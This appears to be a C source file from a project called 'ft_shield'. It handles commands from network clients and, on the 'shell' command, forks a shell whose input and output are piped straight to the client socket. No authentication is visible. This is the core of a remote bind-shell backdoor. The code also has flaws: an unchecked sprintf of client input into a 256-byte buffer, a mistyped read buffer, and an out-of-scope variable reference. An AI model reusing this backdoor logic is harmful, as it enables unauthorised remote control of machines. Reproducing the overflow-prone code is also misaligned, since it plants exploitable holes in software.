#include "ft_shield.h"

t_client	*client = NULL;

void	output_killed(int sig)
{
	(void)sig;
	int status;

	kill(client->shell_pid, SIGKILL);
	waitpid(client->shell_pid, &status, 0);
	if (send_str(client->fd, PROMPT) < 0)
		remove_client(&serv, client->fd);
	exit(0);
}

void	send_output(t_serv *serv, t_client *client, int output[2])
{
	int		status;
	char	*buffer[BUFFER_SIZE];
	int		ret = 0;

	while ((ret = read(output[READ_END], buffer, BUFFER_SIZE)) > 0)
	{
		if (send(client->fd, buffer, ret, 0) < 0)
		{
			remove_client(serv, client->fd);
			break ;
		}
	}
	kill(client->shell_pid, SIGKILL);
	waitpid(client->shell_pid, &status, 0);
	close(output[READ_END]);
	if (send_str(client->fd, PROMPT) < 0)
		remove_client(serv, client->fd);
	exit(0);
}

void	spawn_shell(t_serv *serv, int fd)
{
	for (int i = 0; i < MAX_CLIENTS; i++)
	{
		if (serv->clients[i].fd == fd)
		{
			client = &serv->clients[i];
			break ;
		}
	}
	if (!client)
		return ;
	int			input[2];
	pipe(input);
	client->output_pid = fork();
	if (!client->output_pid)
	{
		int			output[2];

		pipe(output);
		client->shell_pid = fork();
		if (!client->shell_pid)
		{
			close(input[WRITE_END]);
			close(output[READ_END]);
			dup2(input[READ_END], STDIN_FILENO);
			dup2(output[WRITE_END], STDERR_FILENO);
			dup2(output[WRITE_END], STDOUT_FILENO);
			char *argv[] = {BIN_SHELL, NULL};

			execve(argv[0], argv, NULL);
			exit(0);
		}
		signal(SIGINT, output_killed);
		close(input[READ_END]);
		close(input[WRITE_END]);
		close(output[WRITE_END]);
		send_output(serv, client, output);
		exit(0);
	}
	client->fd_shell = input[WRITE_END];
	close(input[READ_END]);
}

void	show_help(t_serv *serv, int fd)
{
	char msg[256];
	char *options[NB_CMDS][2] =
	{
		{"help", "print help menu"},
		{"shell", "spawn a shell"},
	};

	bzero(msg, 256);
	for (size_t i = 0; i < NB_CMDS; i++)
	{
		char tmp[256];
		sprintf(tmp, "   %-18s %s\n", options[i][0], options[i][1]);
		strcat(msg, tmp);
	}
	if (send_str(fd, msg) < 0)
		remove_client(serv, fd);
}

void	launch_command(t_serv *serv, int fd, char *cmd)
{
	char *cmds[NB_CMDS] = CMD;
	void (*functions[NB_CMDS])(t_serv *, int) = CMD_FUNC;

	for (int i = 0; i < NB_CMDS; i++)
	{
		if (!strcmp(cmd, cmds[i]))
			return (functions[i](serv, fd));
	}
	char unknown_cmd[256];
	sprintf(unknown_cmd, "%s: command not found: '%s' - type 'help' to get the help menu\n", PRG_NAME, cmd);
	if (send_str(fd, unknown_cmd) < 0)
		remove_client(serv, fd);
}
